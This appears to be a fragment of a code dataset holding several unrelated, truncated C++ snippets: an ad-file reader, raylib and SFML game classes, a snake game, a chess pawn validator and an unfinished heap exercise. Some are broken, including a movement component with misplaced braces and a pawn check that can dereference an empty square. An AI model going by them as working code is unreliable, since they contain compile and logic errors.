\u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n            if (currentAd.size() == 11) { // \u0415\u0441\u043b\u0438 \u0432 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0438 \u0443\u0436\u0435 11 \u0441\u0442\u0440\u043e\u043a\n                if (currentAd[8] == \"1\" ) {// \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u0442\u043e, \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043b\u0438 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0430\u043a\u0442\u0438\u0432\u043d\u044b\u043c\n                    ads.push_back(currentAd);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0432 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0438\u0440\u0443\u044e\u0449\u0438\u0439 \u0432\u0435\u043a\u0442\u043e\u0440\n                }\n                currentAd.clear(); // \u041e\u0447\u0438\u0449\u0430\u0435\u043c \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u0433\u043e\n            }\n        }\n        file_r.close();\n        return ads;\n    }\n    vector<vector<string>> getAllAdsByBrand(string brand) {\n        ifstream file_r(this->DB);\n        vector<vector<string>> ads; // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0432\u0435\u043a\u0442\u043e\u0440 \u0432\u0435\u043a\u0442\u043e\u0440\u043e\u0432 \u0441\u0442\u0440\u043e\u043a \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0439\n        string line;\n        vector<string> currentAd; // \u0422\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n        while (getline(file_r, line)) { // \u0427\u0438\u0442\u0430\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0438 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\n            currentAd.push_back(line);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0443 \u0432 \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n            if (currentAd.size() == 11) { // \u0415\u0441\u043b\u0438 \u0432 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0438 \u0443\u0436\u0435 11 \u0441\u0442\u0440\u043e\u043a\n                if (currentAd[8] == \"1\"&&currentAd[0] == brand) {// \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u0442\u043e, \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043b\u0438 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0430\u043a\u0442\u0438\u0432\u043d\u044b\u043c\n                    ads.push_back(currentAd);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0432 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0438\u0440\u0443\u044e\u0449\u0438\u0439 \u0432\u0435\u043a\u0442\u043e\u0440\n                }\n                currentAd.clear(); // \u041e\u0447\u0438\u0449\u0430\u0435\u043c \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u0433\u043e\n            }\n        }\n        file_r.close();\n        return ads;\n    }\n    vector<vector<string>> getAllAdsByModel(string model) {\n        ifstream file_r(this->DB);\n        vector<vector<string>> ads; // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0432\u0435\u043a\u0442\u043e\u0440 \u0432\u0435\u043a\u0442\u043e\u0440\u043e\u0432 \u0441\u0442\u0440\u043e\u043a \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0439\n        string line;\n        vector<string> currentAd; // \u0422\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n        while (getline(file_r, line)) { // \u0427\u0438\u0442\u0430\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0438 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\n            currentAd.push_back(line);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0443 \u0432 \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n            if (currentAd.size() == 11) { // \u0415\u0441\u043b\u0438 \u0432 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0438 \u0443\u0436\u0435 11 \u0441\u0442\u0440\u043e\u043a\n                if (currentAd[8] == \"1\" && currentAd[1] == model) {// \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u0442\u043e, \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043b\u0438 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0430\u043a\u0442\u0438\u0432\u043d\u044b\u043c\n                    ads.push_back(currentAd);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0432 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0438\u0440\u0443\u044e\u0449\u0438\u0439 \u0432\u0435\u043a\u0442\u043e\u0440\n                }\n                currentAd.clear(); // \u041e\u0447\u0438\u0449\u0430\u0435\u043c \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u0433\u043e\n            }\n        }\n        file_r.close();\n        return ads;\n    }\n    vector<vector<string>> getAllAdsByPrice(string price, string max_price) {\n        ifstream file_r(this->DB);\n        vector<vector<string>> ads; // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0432\u0435\u043a\u0442\u043e\u0440 \u0432\u0435\u043a\u0442\u043e\u0440\u043e\u0432 \u0441\u0442\u0440\u043e\u043a \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0439\n        string line;\n        vector<string> currentAd; // \u0422\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n        while (getline(file_r, line)) { // \u0427\u0438\u0442\u0430\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0438 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\n            currentAd.push_back(line);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0443 \u0432 \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n            if (currentAd.size() == 11) {\n                string digits_current_ad;\n                string digits_price;\n                string digits_max_price;\n                for (char c : currentAd[4]) {\n                    if (isdigit(c)) {\n                        digits_current_ad += c;\n                    }\n                }\n                for (char c : price) {\n                    if (isdigit(c)) {\n                        digits_price += c;\n                    }\n                }\n                for (char c : max_price) {\n                    if (isdigit(c)) {\n                        digits_max_price += c;\n                    }\n                }\n                if (currentAd[8] == \"1\" && (stoi(digits_current_ad)>=stoi(digits_price)&& stoi(digits_current_ad) <= stoi(digits_max_price))) {// \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u0442\u043e, \u044f\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043b\u0438 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0430\u043a\u0442\u0438\u0432\u043d\u044b\u043c\n                    ads.push_back(currentAd);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0432 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0438\u0440\u0443\u044e\u0449\u0438\u0439 \u0432\u0435\u043a\u0442\u043e\u0440\n                }\n                currentAd.clear(); // \u041e\u0447\u0438\u0449\u0430\u0435\u043c \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0447\u0442\u0435\u043d\u0438\u044f \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u0433\u043e\n            }\n        }\n        file_r.close();\n        return ads;\n    }\n    vector<vector<string>> getAllAdsByPlace(string place) {\n        ifstream file_r(this->DB);\n        vector<vector<string>> ads; // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u0432\u0435\u043a\u0442\u043e\u0440 \u0432\u0435\u043a\u0442\u043e\u0440\u043e\u0432 \u0441\u0442\u0440\u043e\u043a \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0439\n        string line;\n        vector<string> currentAd; // \u0422\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n        while (getline(file_r, line)) { // \u0427\u0438\u0442\u0430\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0438 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\n            currentAd.push_back(line);// \u0414\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0443 \u0432 \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0435\n            if (currentAd.size() == 11) { // \u0415\u0441\u043b\u0438 \u0432 \u043e\u0431\u044a\u044f\u0432\u043b\u0435\u043d\u0438\u0438 \u0443\u0436\u0435 11 \u0441\u0442\u0440\u043e\u043a\n                if",
    "#include \"Levels.h\"\n\nLevels::Levels(int id, Player player, Menu& menu) : player(player) {\n    this->id = id;\n    this->player = player;\n    this->menu = menu;\n    this->startGame = &menu.startGame;\n    this->firstLevelStart = &menu.firstLevelStart;\n    this->firstLevelComplete = &menu.firstLevelComplete;\n    this->secondLevelComplete = &menu.secondLevelComplete;\n    this->secondLevelShark = &menu.secondLevelShark;\n    this->thirdLevelShark = &menu.thirdLevelShark;\n    this->sound_volume = &menu.sound_volume;\n    this->music_volume = &menu.music_volume;\n    this->soundButton = &menu.soundButton;\n    this->musicButton = &menu.musicButton;\n}\n\nvoid Levels::levelInit() {\n    levelBackground();\n\n    if (playerAlive) {\n        if (!levelCompleted) {\n            if (!pauseGame) {\n                setVolume();\n\n                hunts.initHunts(id);\n                hunts.reInitHunts(id);\n                hunts.drawHunts();\n\n                if (id != 1) {\n                    enemies.initEnemies(id);\n                    enemies.reInitEnemies(id);\n                    enemies.drawEnemies(id);\n                }\n\n                player.checkInput();\n                player.manageInput();\n                player.drawPlayer();\n                player.drawUI();\n\n                gameInPauseButton();\n                checkGameInPauseButton();\n\n                checkHuntCollisions(player, hunts);\n\n                if (id != 1) {\n                    checkEnemyCollisions(player, enemies);\n                    drawEffects(player, enemies);\n                }\n\n            } else {\n                setWaitVolume(true);\n\n                pause();\n                checkButton();\n            }\n        } else {\n            setWaitVolume(false);\n\n            if (id != 3) {\n                completed();\n                checkCompletedButton();\n            } else {\n                finished();\n                checkFinishedButton();\n            }\n        }\n    } else {\n        setWaitVolume(false);\n\n        dead();\n        checkDeadButton();\n    }\n\n}\n\nvoid Levels::levelBackground() {\n    Texture2D levelBackground;\n\n    switch (id) {\n        case 1:\n            levelBackground = firstLevelBackground;\n            break;\n\n        case 2:\n            levelBackground = secondLevelBackground;\n            break;\n\n        case 3:\n            levelBackground = thirdLevelBackground;\n            break;\n    }\n\n\n    if (playerAlive) {\n        if (!levelCompleted) {\n            if (!pauseGame) {\n                scrollingBack -= 2.0f;\n            }\n        }\n    }\n\n    if (scrollingBack <= (float)-levelBackground.width) {\n        scrollingBack = 0;\n    }\n\n    ClearBackground(BLACK);\n\n    DrawTextureV(levelBackground, Vector2 { scrollingBack, 0 }, RAYWHITE);\n    DrawTextureV(levelBackground, Vector2 {  (float)levelBackground.width + scrollingBack, 0 }, RAYWHITE);\n}\n\nvoid Levels::gameInPauseButton() const {\n    DrawTexturePro(menu.menuButtons, gameInPauseButtonRec, gameInPauseButtonDes, origin, 0, RAYWHITE);\n}\n\nvoid Levels::checkGameInPauseButton() {\n    mouse_pos = GetMousePosition();\n\n    if (CheckCollisionPointRec(mouse_pos, gameInPauseButtonDes)) {\n        DrawTexturePro(menu.menuButtons, Rectangle { 164, 166, 82, 83 }, gameInPauseButtonDes, origin, 0, RAYWHITE);\n\n        if (IsMouseButtonPressed(MOUSE_BUTTON_LEFT)) {\n            if (!IsSoundPlaying(buttonSound)) {\n                PlaySound(buttonSound);\n            }\n\n            pauseGame = true;\n        }\n    }\n}\n\nvoid Levels::pause() const {\n    DrawTextureV(transparent_black, origin, RAYWHITE);\n    DrawTexturePro(menu.menuPanels, panelRec,panelDes, origin, 0, RAYWHITE);\n\n    if (*soundButton) {\n        DrawTexturePro(menu.menuButtons, menu.soundButtonRec, soundButtonDes, origin, 0, RAYWHITE);\n    } else {\n        DrawTexturePro(menu.menuButtons, menu.muteButtonRec, soundButtonDes, origin, 0, RAYWHITE);\n    }\n\n    if (*musicButton) {\n        DrawTexturePro(menu.menuButtons, menu.musicButtonRec, musicButtonDes, origin, 0, RAYWHITE);\n    } else {\n        DrawTexturePro(menu.menuButtons, menu.musicMuteButtonRec, musicButtonDes, origin, 0, RAYWHITE);\n    }\n\n    DrawTexturePro(menu.menuButtons, mainButtonRec, mainButtonDes, origin, 0, RAYWHITE);\n    DrawTexturePro(menu.menuButtons, menu.returnButtonRec, returnButtonDes, origin, 0, RAYWHITE);\n\n}\n\nvoid Levels::checkButton() {\n    mouse_pos = GetMousePosition();\n\n    if (CheckCollisionPointRec(mouse_pos, soundButtonDes)) {\n        if (*soundButton) {\n            DrawTexturePro(menu.menuButtons, Rectangle { 0, 415, 82, 83 }, soundButtonDes, origin, 0, RAYWHITE);\n        } else {\n            DrawTexturePro(menu.menuButtons, Rectangle { 0, 332, 82, 83 }, soundButtonDes, origin, 0, RAYWHITE);\n        }\n\n        if (IsMouseButtonPressed(MOUSE_BUTTON_LEFT)) {\n            if (!IsSoundPlaying(buttonSound)) {\n                PlaySound(buttonSound);\n            }\n\n            if (*soundButton) {\n                *sound_volume = 0;\n                *soundButton = false;\n            } els",
    "#include <SFML/Graphics.hpp>\n#include <SFML/Window.hpp>\n#include <SFML/System.hpp>\n#include <SFML/Audio.hpp>\n#include <SFML/Network.hpp>\n#include <iostream>\n#include <vector>\n#include <math.h>\n#include <cstdlib>\n#include <sstream>\n#include <fstream>\n#include <cmath>\n#include <string>\n#include <map>\n#include <stack>\n\n// LENGTH OF VECTOR: |V| = sqrt(V.x^2 + V.y^2)\n// NORMALIZE VECTOR: U = V / |V|\nusing namespace std;\nusing namespace sf;\n\nenum button_states\n{\n    BTN_IDLE = 0,\n    BTN_HOVER,\n    BTN_ACTIVE\n};\n\nenum movement_states\n{\n    IDLE = 0,\n    MOVING,\n    MOVING_LEFT,\n    MOVING_RIGHT,\n    MOVING_UP,\n    MOVING_DOWN\n};\nclass MovementComponent\n{ //============================  MovementComponent ====================================================\nprivate:\n    sf::Sprite *sprite;\n    float maxVelocity;\n    float acceleration;\n    float deceleration;\n\n    Vector2f velocity;\n\n    // initializer functions\n\npublic:\n    MovementComponent(sf::Sprite *sprit, float maxvelocity, float acceleration, float deceleration)\n        : sprite(sprit), maxVelocity(maxvelocity), acceleration(acceleration), deceleration(deceleration) {}\n    ~MovementComponent()\n    {\n    }\n    // Accessors\n    const float &getMaxVelocity() const\n    {\n        return this->maxVelocity;\n    }\n\n    const Vector2f &getVelocity() const\n    {\n        return this->velocity;\n    }\n\n    // functions\n\n    const bool getState(const short unsigned state) const\n    {\n        switch (state)\n        {\n        case IDLE:\n            if (this->velocity.x == 0.f && this->velocity.y == 0.f)\n            {\n                return true;\n            }\n            break;\n        case MOVING:\n            if (this->velocity.x != 0.f && this->velocity.y != 0.f)\n            {\n                return true;\n            }\n            break;\n        case MOVING_LEFT:\n            if (this->velocity.x < 0.f)\n            {\n                return true;\n            }\n            break;\n        case MOVING_RIGHT:\n            if (this->velocity.x > 0.f)\n            {\n                return true;\n            }\n            break;\n        case MOVING_UP:\n            if (this->velocity.y < 0.f)\n            {\n                return true;\n            }\n            break;\n        case MOVING_DOWN:\n            if (this->velocity.y > 0.f)\n            {\n                return true;\n            }\n            break;\n        }\n\n        false;\n    }\n    return false;\n}\n\nvoid\nmove(const float dir_x, const float dir_y, const float &dt)\n{\n    // Assclerating  a sprite untile reaches the max velocity\n    // Accecleration\n\n    this->velocity.x += this->maxVelocity * dir_x;\n    this->velocity.y += this->maxVelocity * dir_y;\n}\nvoid update(const float &dt)\n{\n    // Decelerate the sprite and controls the mamximum velocity.\n    // moves the sprite.\n    if (this->velocity.y > 0.f)\n    {\n        // Chack Max vlecity of positive y\n        if (this->velocity.y > this->maxVelocity)\n            this->velocity.y = this->maxVelocity;\n\n        // deceleration Y positive\n        this->velocity.y -= deceleration;\n        if (this->velocity.y < 0.f)\n            this->velocity.y = 0.f;\n    }\n    else if (this->velocity.y < 0.f)\n    {\n        // Chack Max vlecity of negitive y\n\n        if (this->velocity.y < -this->maxVelocity)\n            this->velocity.y = -this->maxVelocity;\n\n        // deceleration Y -VE\n        this->velocity.y += deceleration;\n        if (this->velocity.y > 0.f)\n            this->velocity.y = 0.f;\n    }\n\n    if (this->velocity.x > 0.f)\n    {\n        // Chack Max vlecity of positive x\n        if (this->velocity.x > this->maxVelocity)\n            this->velocity.x = this->maxVelocity;\n\n        // deceleration X positive\n        this->velocity.x -= deceleration;\n        if (this->velocity.x < 0.f)\n            this->velocity.x = 0.f;\n    }\n    else if (this->velocity.x < 0.f)\n    {\n        // Chack Max vlecity of negitive\n        if (this->velocity.x < -this->maxVelocity)\n            this->velocity.x = -this->maxVelocity;\n\n        // deceleration x -VE\n        this->velocity.x += deceleration;\n        if (this->velocity.x > 0.f)\n            this->velocity.x = 0.f;\n    }\n\n    // Final move\n    this->sprite->move(this->velocity * dt); // use this->velocity * dt to make it move at the same speed on all computers\n}\n\n;\n\nclass AnimationComponent\n{ //===========================  ANIMATION COMPONENT  ================================================\nprivate:\n    class Animation\n    { //===============================  Animation  ============================================================\n    public:\n        // Varibles\n        Texture &textureSheet;\n        Sprite &sprite;\n        float animationTimer;\n        float timer;\n        bool done;\n        float width;\n        float height;\n        IntRect startRectSourceSprite; //(235,0,108.33,164.75)\n        IntRect currentReack;\n        IntRect endRectSourceSprite;\n\n        // Contructor / Distructor\n        Animation(Sprite &sprite, Texture &texturSheet, float an",
    "\ufeff#include \"GamePlay.h\"\n#include <fstream>\n#include <string>\n\n\nint GamePlay::m_highestScore = 0;\nsf::Sound State::m_BGS;\nGamePlay::GamePlay(std::shared_ptr<Context>& context)\n\t:m_context{ context }, m_snake_direction{16.f,0.f}, m_elapsedTime{sf::Time::Zero},\n\tm_score{ 0 }, IsPause{false}, m_level{1}, m_speed{0.1}\n{\n\tLoadHighScore();\n}\n\nGamePlay::~GamePlay() {\n\tSaveHighScore();\n}\n\nvoid GamePlay::Init() {\n\n\tsize = m_context->m_window->getSize();\n\n\tm_ScoreBox.setTexture(m_context->m_Assets->Get_Texture(SCOREBOX));\n\tm_ScoreBox.setPosition(sf::Vector2f(size.x-234, size.y-600));\n\tm_ScoreBox.setScale(sf::Vector2f(1.3, 1));\n\n\tm_scoreText.setFont(m_context->m_Assets->Get_Font(MAIN_FONT));\n\tm_scoreText.setString(\"Score : \" + std::to_string(m_score));\n\tm_scoreText.setPosition(sf::Vector2f(size.x - 196, size.y - 600 + 14));\n\tm_scoreText.setCharacterSize(30);\n\n\tm_LevelBox.setTexture(m_context->m_Assets->Get_Texture(SCOREBOX));\n\tm_LevelBox.setPosition(sf::Vector2f(size.x - 234, size.y - 570 + 80));\n\tm_LevelBox.setScale(sf::Vector2f(1.3, 1));\n\n\tm_levelText.setFont(m_context->m_Assets->Get_Font(MAIN_FONT));\n\tm_levelText.setString(\"Level : \" + std::to_string(m_level));\n\tm_levelText.setPosition(sf::Vector2f(size.x - 196, size.y - 570 + 14 + 80));\n\tm_levelText.setCharacterSize(30);\n\n\tm_HighestBox.setTexture(m_context->m_Assets->Get_Texture(SCOREBOX));\n\tm_HighestBox.setPosition(sf::Vector2f(size.x - 234, size.y - 570 + 180));\n\tm_HighestBox.setScale(sf::Vector2f(1.3, 1));\n\n\tm_highestText.setFont(m_context->m_Assets->Get_Font(MAIN_FONT));\n\tm_highestText.setString(\"Highest : \" + std::to_string(m_highestScore));\n\tm_highestText.setPosition(sf::Vector2f(size.x - 212, size.y - 570 + 14 + 180));\n\tm_highestText.setCharacterSize(30);\n\t\n\t\n\tm_grass.setTexture(m_context->m_Assets->Get_Texture(GRASS));\n\t// if we set getviewport\n\tm_grass.setTextureRect(m_context->m_window->getViewport(m_context->m_window->getDefaultView()));\n\t//m_grass.setTextureRect(sf::IntRect (0,0,400,200));\n\tm_EatingSound.setBuffer(m_context->m_Assets->Get_Sound(EATINGSOUND));\n\t\n\tm_BGS.setBuffer(m_context->m_Assets->Get_Sound(BGS));\n\tm_BGS.setLoop(true);\n\tm_BGS.setVolume(50);\n\tif (m_context->isMusicEna) {\n\t\tm_BGS.play();\n\t}\n\t\n\n\t\n\n\tfor (auto& walls : m_walls) {\n\t\twalls.setTexture(m_context->m_Assets->Get_Texture(WALL));\n\t}\n\n\tm_walls[0].setTextureRect(sf::IntRect(0, 0, size.x, 16));\n\tm_walls[1].setTextureRect(sf::IntRect(0, 0, 16, size.y));  // x, y, width, height\n\n\tm_walls[2].setPosition(sf::Vector2f(size.x - 16, 0));\n\tm_walls[2].setTextureRect(sf::IntRect(0, 0, 16, size.y));\n\n\tm_walls[3].setPosition(sf::Vector2f(0, size.y -16));\n\tm_walls[3].setTextureRect(sf::IntRect(0, 0, size.x, 16));\n\n\tm_walls[4].setPosition(sf::Vector2f(size.x - 280 - 16, 0));\n\tm_walls[4].setTextureRect(sf::IntRect(0, 0, 16, size.y));\n\n\tm_food.setTexture(m_context->m_Assets->Get_Texture(FOOD));\n\t//m_food.setOrigin(sf::Vector2f(32.f, 32.f));\n\tm_food.setPosition((m_context->m_window->getSize().x / 2)-140,\n\t\tm_context->m_window->getSize().y / 2);\n\n\tm_snake.Init(m_context->m_Assets->Get_Texture(SNAKE));\n\n}\n\nvoid GamePlay::ProcessInput() {\n\tsf::Event ev;\n\twhile (m_context->m_window->pollEvent(ev)) {\n\t\tif (ev.type == sf::Event::Closed)\n\t\t\tm_context->m_window->close();\n\t\telse if (ev.type == sf::Event::KeyPressed) {\n\t\t\tsf::Vector2f newDirection = m_snake_direction; \n\t\t\tswitch (ev.key.code) {\n\t\t\t\tcase sf::Keyboard::Up: {\n\t\t\t\t\tnewDirection = sf::Vector2f(0, -16.f);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcase sf::Keyboard::Down: {\n\t\t\t\t\tnewDirection = sf::Vector2f(0, 16.f);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcase sf::Keyboard::Left: {\n\t\t\t\t\tnewDirection = sf::Vector2f(-16.f, 0.f);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcase sf::Keyboard::Right: {\n\t\t\t\t\tnewDirection = sf::Vector2f(16.f, 0.f);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcase sf::Keyboard::Escape: {\n\t\t\t\t\t// Pause\n\t\t\t\t\tm_context->m_States->Add(std::make_unique<PauseGame>(m_context));\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (!((newDirection + m_snake_direction) == sf::Vector2f(0, 0))) {\n\t\t\t\tm_snake_direction = newDirection;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid GamePlay::Update(sf::Time deltaTime) {\n\n\tif (!this->IsPause) {\n\t\tm_elapsedTime += deltaTime;\n\n\t\tif (m_score >= 50) {\n\t\t\tm_level = 6;\n\t\t\tm_speed = 0.01;\n\t\t}\n\t\telse if (m_score >= 40) {\n\t\t\tm_level = 5;\n\t\t\tm_speed = 0.02;\n\t\t}\n\t\telse if (m_score >= 30) {\n\t\t\tm_level = 4;\n\t\t\tm_speed = 0.04;\n\t\t}\n\t\telse if (m_score >= 20) {\n\t\t\tm_level = 3;\n\t\t\tm_speed = 0.06;\n\t\t}\n\t\telse if (m_score >= 10) {\n\t\t\tm_level = 2;\n\t\t\tm_speed = 0.08;\n\t\t}\n\n\t\tif (m_elapsedTime.asSeconds() > m_speed) {\t// it will call function move at 0.1ms (snake speed)\n\n\t\t\tbool isOnWall = false;\n\t\t\tfor (auto& wall : m_walls) {\n\t\t\t\tif (m_snake.IsOn(wall)) {\n\t\t\t\t\t// Change to GameOver State;\n\t\t\t\t\tm_context->m_States->Add(std::make_unique<GameOver>(m_context), true);\n\t\t\t\t\tm_BGS.stop();\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (m_snake.IsOn(m_food)) {\n\t\t\t\tint maxX = static_cast<int>(this->m_context->m_window->getSize().x - 32 - 280);\n\t\t\t\tint maxY = static_cast<int>(this->m_context->m_window->getSize().y - 32);\n\n\t\t\t\tint foodX = 16 + ((rand() % (maxX / 16)) * 1",
    "// Copyright (2024) Alvin Yu\n\n#include \"Pawn.hpp\"\n\n\nbool Pawn::move(int row, int col, int dRow, int dCol,\n                std::vector<std::vector<std::shared_ptr<Piece>>> board) {\n    int cRow = dRow - row;\n    int cCol = dCol - col;\n\n    // White Initial Double Move\n    if (cRow == -2 && cCol == 0 && row == 6) {\n        switch (color()) {\n            case White:\n                _ep = true;\n                return row == 6 && board[dRow][dCol] == nullptr;\n            case Black:\n                return false;\n        }\n    }\n\n    // Black Initial Double Move\n    if (cRow == 2 && cCol == 0 && row == 1) {\n        switch (color()) {\n            case Black:\n                _ep = true;\n                return row == 1 && board[dRow][dCol] == nullptr;\n            case White:\n                return false;\n        }\n    }\n\n    // Make sure that the move is 1 unit\n    if (abs(cRow) > 1 || abs(cCol) > 1) {\n        return false;\n    }\n\n    switch (color()) {\n        case White:\n            if (cRow == 1) return false;\n            break;\n        case Black:\n            if (cRow == -1) return false;\n            break;\n        default:\n            return false;\n    }\n\n    // Diagonal Movement\n    if (abs(cCol) == 1 && abs(cRow) == 1) {\n        if (board[dRow][dCol] != nullptr) {\n            return board[row][col]->color() != board[dRow][dCol]->color();\n        } else if (row == 4 && board[4][dCol]->type() == P && board[4][dCol]->color() == White\n                    && board[row][col]->color() == Black) {\n            return board[4][dCol]->ep();\n        } else if (row == 3 && board[3][dCol]->type() == P && board[3][dCol]->color() == Black\n                    && board[row][col]->color() == White) {\n            return board[3][dCol]->ep();\n        } else {\n            return false;\n        }\n    }\n\n    std::cout << \"Success\" << std::endl;\n\n    return board[dRow][dCol] == nullptr;\n}\n\n\n\n",
    "#include <iostream>\n#include <vector>\n#include <stdexcept> // For std::out_of_range\n\ntemplate<typename T>\nclass PriorityQueue {\nprivate:\n    std::vector<T> heap;\n\n    void heapifyUp(int index) {\n        while (index > 0 && heap[parent(index)] < heap[index]) {\n            std::swap(heap[parent(index)], heap[index]);\n            index = parent(index);\n        }\n    }\n\n    void heapifyDown(int index) {\n        int largest = index;\n        int leftChildIdx = leftChild(index);\n        int rightChildIdx = rightChild(index);\n\n        if (leftChildIdx < heap.size() && heap[leftChildIdx] > heap[largest]) {\n            largest = leftChildIdx;\n        }\n\n        if (rightChildIdx < heap.size() && heap[rightChildIdx] > heap[largest]) {\n            largest = rightChildIdx;\n        }\n\n        if (largest != index) {\n            std::swap(heap[index], heap[largest]);\n            heapifyDown(largest);\n        }\n    }\n\n    int parent(int index) { return (index - 1) / 2; }\n    int leftChild(int index) { return 2 * index + 1; }\n    int rightChild(int index) { return 2 * index + 2; }\n\npublic:\n   //Default constructor\n    PriorityQueue() {}\n /* Implement this function\n   Put the value at the back  of the vector\n   Then call HeapifyUp\n   */\n    void insert(const T& value) {\n        //Your code goes here\n    }\n\n/* Implement this function\n  Swap the largest element with the last element of \n  the vector, delete the last element, call heapifyDown\n  and return the value of the deleted element\n*/\n    T extractMax() {\n        \n        //your code goes here\n    }\n\n    bool isEmpty() const {\n        return heap.empty();\n    }\n};\n\n// Example usage\nint main() {\n    PriorityQueue<int> pq;\n    pq.insert(30);\n    pq.insert(20);\n    pq.insert(15);\n    pq.insert(5);\n    pq.insert(10);\n    pq.insert(12);\n    pq.insert(6);\n\n    std::cout << \"Extracting max: \" << 